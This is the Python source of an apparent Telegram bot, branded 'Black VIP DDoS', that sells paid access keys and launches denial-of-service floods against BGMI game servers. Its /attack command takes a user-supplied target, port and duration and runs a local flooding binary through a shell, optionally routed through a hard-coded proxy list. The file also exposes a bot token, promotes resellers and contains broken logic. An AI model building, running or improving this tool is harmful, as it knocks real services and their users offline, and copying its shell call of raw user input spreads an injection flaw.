import telebot
import time
import datetime
import subprocess
import os
import logging
import random
import string
import json
from telebot import types
from threading import Timer, Thread
from requests.exceptions import ReadTimeout, ConnectionError
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Load configuration
CONFIG_FILE = 'config.json'

# Configure logging

logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')


# insert your Telegram bot token here
bot = telebot.TeleBot('7512318354:AAEuiH66Jrm35hMFQfL1xV7dNnbzvnkONck')

# Owner user IDs
owner_id = "1725783398"

# Admin user IDs
admin_ids = ["1725783398"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store free user IDs and their credits
FREE_USER_FILE = "free_users.txt"

# File to store admin IDs
ADMIN_FILE = "admins.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store proxy list

PROXY_FILE = "n.txt"

# Dictionary to store free user credits

free_user_credits = {}

# Dictionary to store gift codes with duration

#expiry

expiration_date = {}

gift_codes = {}

# Key prices for different durations

key_prices = {

    "Day": 200,

    "Week": 900,

    "Month": 1800

}

def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

def write_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)
        
config = load_config()
free_user_credits = config.get('free_user_credits', {})

#this id proxy by attackddosowner
def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []
        

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()
read_free_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_ids = ["1725783398"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully "
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]
            if duration not in key_prices:
                response = "Invalid duration. Use 'Day', 'Week', or 'Month'."
                bot.send_message(message.chat.id, response)
                return

            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "𝗗𝗮𝘆" else 7 if duration == "𝗪𝗲𝗲𝗸" else 30 if duration == "𝗠𝗼𝗻𝘁𝗵" else 30)
            allowed_user_ids.append(user_to_approve)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_approve} {expiration_date}\n")
                
            response = f"*User {user_to_approve} approved for {duration} 👍*."
        else:
            response = "⚠️ Usage: /approve <id> <duration>"
    else:
        response = "*You dont have permission to use this command.*"

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = f"*User {user_to_remove} removed successfully from user list 👍*."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "⚠️ Usage: /removeuser <id>"
    else:
        response = "*You dont have permission to use this command.*"

    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            admin_to_add = command[1]
            balance = int(command[2])
            admin_ids.append(admin_to_add)
            free_user_credits[admin_to_add] = balance
            response = f"*User {admin_to_add} admin approved with balance {balance} 👍*."
        else:
            response = "⚠️ Usage: /addadmin <id> <balance>"
    else:
        response = "*You dont have permission to this command.*"

    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                response = f"*User {admin_to_remove} removed successfully from admin list 👍*."
            else:
                response = f"Admin {admin_to_remove} not found in the list ❌."
        else:
            response = "⚠️ Usage: /removeadmin <id>"
    else:
        response = "*You dont have permission to this command.*"
        
    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "𝙈𝙪𝙢𝙚 𝙇𝙚 𝘽𝙨𝙙𝙠 𝙈𝙖𝙙𝙚𝙧𝙘𝙝𝙤𝙙 𝙉𝙞𝙠𝙖𝙡 😡."

    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in free_user_credits:
        response = f"*💰 Your current balance is: {free_user_credits[user_id]} credits*"
    else:
        response = "You do not have a balance account ❌."
    bot.send_message(message.chat.id, response, parse_mode='Markdown')
    
@bot.message_handler(commands=['generatekey'])
def create_gift(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            duration = command[1]
            if duration in key_prices:
                amount = key_prices[duration]
                if user_id in free_user_credits and free_user_credits[user_id] >= amount:
                    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    gift_codes[code] = duration
                    free_user_credits[user_id] -= amount
                    response = f"✨ 𝗞𝗲𝘆 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✨\n\n🔐 𝗞𝗲𝘆 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n• 𝗞𝗲𝘆: `{code}`\n• 𝗘𝘅𝗽𝗶𝗿𝘆 𝘁𝘆𝗽𝗲: *{duration}*\n• 𝗠𝗮𝘅 𝘂𝘀𝗲𝘀:  𝟭"
                else:
                    response = "You do not have enough credits to create a gift code."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "⚠️ Usage: /generatekey <day/week/month>"
    else:
        response = "*You dont have permission to use this command.*"

    bot.send_message(message.chat.id, response, parse_mode='Markdown')
    
    
@bot.message_handler(commands=['activatekey'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        if code in gift_codes:
            duration = gift_codes.pop(code)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "𝗗𝗮𝘆" else 7 if duration == "𝗪𝗲𝗲𝗸" else 30 if duration == "𝗠𝗼𝗻𝘁𝗵" else 30)
            if user_id not in allowed_user_ids:
                allowed_user_ids.append(user_id)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_id} {expiration_date}\n")
            response = f"✨ 𝗞𝗲𝘆 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✨\n\n🔐 𝗞𝗲𝘆 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n📅 𝗧𝘆𝗽𝗲: *{duration}*\n⏱️ 𝗠𝗮𝘅 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: 𝟮𝟰𝟬 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n🛠️ 𝗔𝗰𝘁𝗶𝗼𝗻: 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗲𝘅𝘁𝗲𝗻𝗱𝗲𝗱"
        else:
            response = "*❌ Invalid or already used key!*"
    else:
        response = "*❌ Please provide the activation key. Usage format: /activatekey <key>*"

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully "
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = ""
    bot.send_message(message.chat.id, response, parse_mode='Markdown')


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully "
        except FileNotFoundError:
            response = "users are already cleared ."
    else:
        response = ""
    bot.send_message(message.chat.id, response)
 
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.send_message(message.chat.id, response)
        else:
            response = "No data found "
            bot.send_message(message.chat.id, response)
    else:
        response = ""
        bot.send_message(message.chat.id, response)


    bot.send_message(user_id, response, parse_mode='Markdown')
    
# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_id = str(message.chat.id)
    user_info = message.from_user
    username = user_info.username
    first_name = user_info.first_name
    last_name = user_info.last_name
    
    response = f"🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗! 🚀\n🎯 𝗧𝗮𝗿𝗴𝗲𝘁: *{target}*\n🔌 𝗣𝗼𝗿𝘁: *{port}*\n⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: *{time} seconds*\n✨ 𝗠𝗲𝘁𝗵𝗼𝗱: *Black Hat Antiban Injected*\n⚡️ 𝗦𝘁𝗮𝘁𝘂𝘀: *Attack in progress........*"
    
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =60

# Function to read proxies from file
def read_proxies():
    try:
        with open(PROXY_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to get a random proxy
def get_random_proxy():
    proxies = read_proxies()
    if proxies:
        return random.choice(proxies)
    return None

# Handler for /attack1 command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    user_info = message.from_user
    user_name = user_info.first_name
    if user_id in allowed_user_ids:
        # Check if the user is in admin_ids (admins have no cooldown)
        if user_id not in user_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:60
            response = "*❌ You need to wait 60 seconds before usage /attack command.*"
            bot.send_message(message.chat.id, response)
            return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 240:
                response = "*⚠️ Maximum attack time is 240 seconds.*"
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                # Use a proxy if available
                proxy = get_random_proxy()
                if proxy:
                    full_command = f"proxychains4 -q ./bgmi {target} {port} {time} 900"
                    os.environ['PROXYCHAINS_PROXY'] = proxy
                else:
                    full_command = f"./bgmi {target} {port} {time} 900"
                    subprocess.run(full_command, shell=True)
                response = f"✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗! ✅\n🎯 𝗧𝗮𝗿𝗴𝗲𝘁: *{target}*\n🔌 𝗣𝗼𝗿𝘁: *{port}*\n⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: *{time} seconds*\n⚡️ 𝗦𝘁𝗮𝘁𝘂𝘀: *Attack finished successfully..........*"
        else:
            response = "🎮𝗔𝗥𝗘 𝗬𝗢𝗨 𝗥𝗘𝗔𝗗𝗬 𝗧𝗢 𝗙𝗨𝗖𝗞 𝗕𝗚𝗠𝗜🎯\n\n🔥 𝗕𝗟𝗔𝗖𝗞 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 📈\n\n📝 𝗨𝘀𝗮𝗴𝗲: */attack <target> <port> <time>*\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: */attack 1.1.1.1 80 120*\n\n⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:\n• 𝗠𝗮𝘅 𝘁𝗶𝗺𝗲: *240* 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: *1* 𝗺𝗶𝗻𝘂𝘁𝗲𝘀"  # Updated command syntax
    else:
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔\n\n🔥 𝗕𝗟𝗔𝗖𝗞 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 📈\n\n🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀:\n• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿\n📢 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀: ➡️ *@BlackHatDDoS*"

    bot.send_message(message.chat.id, response, parse_mode='Markdown')
    
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"*🤖 UserID:* `{user_id}`"
    bot.send_message(message.chat.id, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = ""

    bot.send_message(message.chat.id, response)

@bot.message_handler(func=lambda message: message.text == '💼 ResellerShip')
def handle_buy_access_button(message):
    response = (f"Contact @BlackHatDDoS for reseller ship")
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=[''])
def show_help(message):
    help_text ='''Available Commands:
    
User Commands:
- /start : Start the bot and initialize your profile
- /attack : Triger a powerful attack on bgmi server
- /activatekey <key> : Activate a subscription key
- /help : Display this help message
- /mylogs : Check Logs

Note: For more details on specific commands or assistance, contact the admin.
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown')

# Bot command handlers
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.chat.id)
    username = message.from_user.username
    response = f'''⚡️𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗕𝗟𝗔𝗖𝗞 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦⚡️\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲, @{username}!\n🆔 𝗬𝗼𝘂𝗿 𝗜𝗗: `{user_id}`\n\n🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n• */attack* - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n• */activatekey* - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n• */checkbalance* - 𝗖𝗵𝗲𝗰𝗸 𝗕𝗮𝗹𝗮𝗻𝗰𝗲\n\n💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗜𝗻𝗮𝗰𝘁𝗶𝘃𝗲 ❌\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n\n📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀: *@BlackHatDDoS*\n━━━━━━━━━━━━━━━━━━━━━━━━━━'''
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['BotPing'])
def show_help(message):
    help_text ='''🌡️ Bot Ping: 677.00
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.send_message(message.chat.id, help_text)
    
@bot.message_handler(commands=[''])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED CHANNEL OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.send_message(message.chat.id, response)

@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def welcome_plan(message):
    user_id = str(message.chat.id)
    username = message.from_user.first_name
    response = f'''*🏛️ Account Info:*\n\n• Role: *User*\n• UserID: `{user_id}`\n• Username: {username}\n• Expiry: *{expiration_date}*
'''
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['Canary'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''*Please use the following link for Canary Download: https://t.me/NUCLEARPALA/30*
'''
    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=[''])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''* 🤩 Welcome to Bgmi-D-DoS BOT
💥 /approve : user to approve
💥 /remove : user to remove
🌜 /addadmin : add admin to tha bot
❣️ /removeadmin : remove admin to tha bot
🔑 /generatekey : generate redeem code
⚡ /CheckBalance : check balance
🤩 /clearlogs : check all logs*
'''
    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=[''])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''* 🤩 Welcome to Bgmi-D-DoS BOT
💥 /approve : user to approve
💥 /remove : user to remove
🌜 /addadmin : add admin to tha bot
❣️ /removeadmin : remove admin to tha bot*
'''
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = ""

    bot.send_message(message.chat.id, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


